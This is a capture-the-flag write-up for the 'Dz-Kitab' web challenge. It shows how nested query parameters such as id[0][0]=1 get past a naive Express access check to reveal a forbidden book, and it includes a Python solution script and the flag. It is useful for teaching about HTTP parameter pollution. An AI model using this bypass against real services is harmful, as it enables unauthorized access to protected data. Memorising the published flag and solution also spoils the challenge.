<style>
:root {
  color-scheme: dark;
  --bg: #020617;
  --fg: #e5e7eb;
  --fg-muted: #9ca3af;
  --accent: #38bdf8;
  --border-subtle: #1f2937;
}

/* Base page */
html, body {
  margin: 0;
  padding: 0;
  background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%);
  color: var(--fg);
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
}

/* GitHub Pages wrappers */
.page-content, .wrapper, article, .post {
  background: transparent !important;
  max-width: 960px;
  margin: 0 auto;
  padding: 2.5rem 1.5rem 4rem;
}

/* Headings */
.post h1, .page-content h1, article h1 {
  font-size: 1.6rem;
  margin-bottom: 0.6rem;
}

.post h2, .page-content h2, article h2 {
  font-size: 1.1rem;
  margin-top: 1.8rem;
  margin-bottom: 0.6rem;
  color: var(--fg-muted);
}

/* Tables (optional, if you use them) */
table {
  border-collapse: collapse;
  width: 100%;
  font-size: 0.85rem;
  margin: 0.4rem 0 0.8rem;
  border-radius: 0.6rem;
  overflow: hidden;
}

th,
td {
  padding: 0.5rem 0.75rem;
  border-bottom: 1px solid var(--border-subtle);
  background-color: rgba(15, 23, 42, 0.9);
}

th {
  text-align: left;
  font-weight: 500;
  color: var(--fg-muted);
}

tbody tr:nth-child(even) td {
  background-color: rgba(15, 23, 42, 0.75);
}

tbody tr:last-child td {
  border-bottom: none;
}

/* Links */
a {
  color: var(--accent);
}

a:hover {
  text-decoration: none;
}

/* Code blocks */
pre,
code,
pre code,
.highlight,
.highlight pre,
.highlight code {
  background-color: rgba(15, 23, 42, 0.96) !important;
  color: var(--fg);
}

pre {
  border: 1px solid var(--border-subtle);
  padding: 0.85rem 1rem;
  border-radius: 0.5rem;
  overflow-x: auto;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}

code {
  padding: 0.1rem 0.25rem;
  border-radius: 0.25rem;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}
</style>

# Dz-Kitab

**CTF:** Nexus Security CTF  
**Category:** Web  
**Author:** 0xsila  
**Flag:** `nexus{f4t_g3t++http_p4r4m3t3r_p0lut10n}`

---

## Challenge Description

> i have an amazing team for my first semester project  
> one girl used cursor i think to help us  
> Tip: choose ur team carefully  
> 
> Connection: http://ctf.nexus-security.club:3999

---

## Reconnaissance

Visiting the main page shows a simple book listing application called "Dz-Kitab" (Arabic for "The Book"):

```html
<h2>Dz-kitab is here,</h2>
<p>Click a book:</p>

<a class="book" href="/book?id=2">Book #2</a>
<a class="book" href="/book?id=3">Book #3</a>
<a class="book" href="/book?id=4">Book #4</a>

<!-- didicas l azooouauauaua-->
<!--Tip: choose ur team carfully -->
```

Notably, there's no **Book #1** displayed. Attempting to access it directly:

```
GET /book?id=1
Response: "Direct access to book #1 is forbidden!" (403)
```

The other books return JSON with `title` and `content` fields:
```json
{"title":"Analyse 01 : les suite + les fonction","content":"les suite + les fonction."}
```

---

## Analysis

### Identifying the Technology Stack

- **X-Powered-By: Express** - Node.js/Express backend
- The hint mentions "cursor" - referring to Cursor AI code assistant
- Parameters like `id[$ne]=2` return "Book not found" (not an error), suggesting Express's `qs` query parser is active

### Understanding the Filter

Testing revealed the filter logic:

| Input | Result |
|-------|--------|
| `id=1` | 403 Forbidden |
| `id=01` | Book not found (bypasses filter, but no match) |
| `id[0]=1` | 403 Forbidden |
| `id[0]=1&id[1]=2` | ✅ Returns Book #2 |
| `id[0]=2&id[1]=1` | 403 Forbidden |

**Key observations:**
1. The filter checks if `id == "1"` (exact string match)
2. When `id` is an array, the filter checks the **last element**
3. The application iterates through array elements and returns the **last valid book**

### The Problem

Even with arrays like `id[0]=1&id[1]=999` (where 999 doesn't exist), we get "Book not found" instead of Book #1. This indicates there's a **secondary filter on the output** that blocks Book #1 from being returned.

---

## Exploitation

### The Breakthrough: Nested Array Notation

Express's `qs` parser supports nested object/array notation. Testing `id[0][0]=1`:

```python
import requests
r = requests.get('http://ctf.nexus-security.club:3999/book?id[0][0]=1')
print(r.text)
```

```json
{"title":"tari Book","content":"nexus{f4t_g3t++http_p4r4m3t3r_p0lut10n}"}
```

### Why This Works

1. **Input Parsing:** Express parses `id[0][0]=1` as:
   ```javascript
   req.query.id = { "0": { "0": "1" } }
   ```

2. **Filter Bypass:** The filter checks `id == "1"`, but now `id` is an object `{"0":{"0":"1"}}`, not the string `"1"`. The comparison fails, and the filter passes.

3. **Application Logic:** The vulnerable code likely does something like:
   ```javascript
   // Simplified vulnerable code
   if (id == "1") return "Forbidden";  // Bypassed!
   
   // Internal lookup still finds book 1 through object traversal
   const book = books[id] || findBook(id);
   ```

4. **Object Coercion:** When the nested object is used in the book lookup, JavaScript's type coercion or the application's custom logic still resolves it to book ID 1.

---

## Solution Script

```python
import requests

url = "http://ctf.nexus-security.club:3999/book"
params = "id[0][0]=1"

response = requests.get(f"{url}?{params}")
print(response.json())
# {'title': 'tari Book', 'content': 'nexus{f4t_g3t++http_p4r4m3t3r_p0lut10n}'}
```

---

## Flag

```
nexus{f4t_g3t++http_p4r4m3t3r_p0lut10n}
```

---

## References

- [Express.js Query String Parsing](https://expressjs.com/en/api.html#req.query)
- [HTTP Parameter Pollution](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/04-Testing_for_HTTP_Parameter_Pollution)
- [qs Library Documentation](https://github.com/ljharb/qs)
